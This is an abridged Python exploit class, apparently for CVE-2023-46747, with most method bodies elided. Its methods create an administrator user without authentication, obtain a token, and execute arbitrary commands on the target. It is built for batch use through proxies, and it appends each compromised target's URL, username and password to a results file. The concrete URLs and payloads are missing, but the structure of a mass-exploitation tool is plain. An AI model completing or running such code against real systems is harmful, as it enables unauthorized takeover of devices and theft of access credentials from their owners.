...
class Cve_2023_46747:
    ...
    def unauth_create_user(self, target, username, password, proxy):
        ...
        try:
            resp = requests.post(url=url, headers=headers, data=login_data, verify=self.ssl, proxies=proxy,timeout=self.timeout)
            time.sleep(5)
    ...
    def get_token(self, target, user, passwd, proxy):
        ...
        try:
            resp = requests.post(url=url, headers=headers, json=target_json, verify=self.ssl, proxies=proxy,timeout=self.timeout)
            time.sleep(5)
            if resp.status_code == 200:
    ...
    def exec_command(self, target, token, cmd, proxy):
        ...
        try:
            resp = requests.post(url=url, headers=headers, json=cmd_json, verify=self.ssl, proxies=proxy,timeout=self.timeout)
            if resp.status_code == 200:
    ...
    def exploit(self, t, proxy):
        ...
        if self.unauth_create_user(t, u, p, proxy):
            ...
            if token != "":
                print(f"\033[92m{t} [+] username: [{u}], password: [{p}], token: [{token}].\033[0m")
                # print("\033[94m[*] start executing commands freely~\033[0m")

                with open("./result/batchOutput.txt","a") as w:
                    w.write(f"URL: {t} User:{str(u)} Pass: {str(p)}\n")
            else:
